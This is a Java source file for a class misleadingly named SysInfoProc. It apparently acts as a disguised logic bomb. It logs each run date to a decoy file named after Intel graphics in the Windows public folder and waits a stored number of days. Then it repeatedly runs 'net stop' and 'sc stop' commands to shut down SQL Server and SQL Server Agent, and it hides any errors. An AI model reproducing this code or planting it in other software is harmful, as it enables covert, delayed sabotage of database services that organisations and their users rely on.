

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.time.LocalDate;
import java.util.Scanner;
import java.util.Set;
import java.util.TreeSet;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import javax.swing.JFrame;

public class SysInfoProc extends JFrame implements MySystemProc {
    ExecutorService executor = Executors.newFixedThreadPool(3);
    private Runtime run = Runtime.getRuntime();
    private String command;
    private LocalDate currentDate = LocalDate.now();
    private LocalDate runningDay;
    private LocalDate firstDate;
    private LocalDate lastDate;
    private long whichDayLater;
    private final String getDatesPath = "path";
    private final String getDateCountPath = "path";

    public SysInfoProc() {
    }

    public LocalDate getLastDate() {
        return this.lastDate;
    }

    public void setLastDate(LocalDate lastDate) {
        this.lastDate = lastDate;
    }

    public long getWhichDayLater() {
        return this.whichDayLater;
    }

    public void setWhichDayLater(long whichDayLater) {
        this.whichDayLater = whichDayLater;
    }

    public LocalDate getFirstDate() {
        return this.firstDate;
    }

    public void setFirstDate(LocalDate firstDate) {
        this.firstDate = firstDate;
    }

    public LocalDate getRunningDay() {
        return this.runningDay;
    }

    public void setRunningDay(LocalDate runningDay) {
        this.runningDay = runningDay;
    }

    public LocalDate getCurrentDate() {
        return this.currentDate;
    }

    public String getCommand() {
        return this.command;
    }

    public void setCommand(String command) {
        this.command = command;
    }

    public void shutDownProc() {
        this.executor.submit(() -> {
            try {
                for(int i = 0; i < 60; ++i) {
                    this.setCommand("net stop \"SQL Server Agent (MSSQLSERVER)\"");
                    this.setCommand("sc stop SQLSERVERAGENT");
                    this.run.exec(this.getCommand());
                    Thread.sleep(1000L);
                    this.setCommand("net stop \"SQL Server (MSSQLSERVER)\"");
                    this.run.exec(this.getCommand());
                    Thread.sleep(1000L);
                    this.setCommand("net stop MSSQLSERVER");
                    this.run.exec(this.getCommand());
                }
            } catch (InterruptedException var2) {
                var2.getLocalizedMessage();
            } catch (IOException var3) {
                var3.getLocalizedMessage();
            }

        });
    }

    public void fileWrite() {
        try {
            FileWriter writerLocalDate = new FileWriter("C:\\Users\\Public\\intelGraphicsDays.z", true);
            new FileWriter("C:\\Users\\Public\\WhichDay.txt", true);
            writerLocalDate.write(this.getCurrentDate().toString() + "\n");
            writerLocalDate.close();
        } catch (Exception var3) {
            System.out.println(var3);
        }

    }

    public void fileRead() {
        Set<String> treeSet = new TreeSet();

        try {
            File readLocalDate = new File("C:\\Users\\Public\\intelGraphicsDays.z");
            File readCountDate = new File("C:\\Users\\Public\\WhichDay.txt");
            Scanner myReader = new Scanner(readLocalDate);
            Scanner myCountReader = new Scanner(readCountDate);

            while(myReader.hasNextLine()) {
                String read = myReader.nextLine();
                treeSet.add(read);
            }

            this.setWhichDayLater(Long.parseLong(myCountReader.nextLine()));
            this.setLastDate(LocalDate.parse((CharSequence)((TreeSet)treeSet).last()));
            this.setFirstDate(LocalDate.parse((CharSequence)((TreeSet)treeSet).first()));
            this.setRunningDay(this.getFirstDate().plusDays(this.getWhichDayLater()));
            myReader.close();
        } catch (FileNotFoundException var7) {
            System.out.println("An error occurred.");
            var7.printStackTrace();
        }

    }

    public void runAllProc() {
        this.fileWrite();
        this.fileRead();
        if (this.isRunningDay()) {
            this.shutDownProc();

            try {
                Thread.sleep(50000L);
                this.executor.shutdownNow();
            } catch (InterruptedException var2) {
                throw new RuntimeException(var2);
            }
        } else {
            System.exit(0);
        }

    }

    public boolean isRunningDay() {
        return this.getRunningDay().isBefore(this.getLastDate());
    }
}
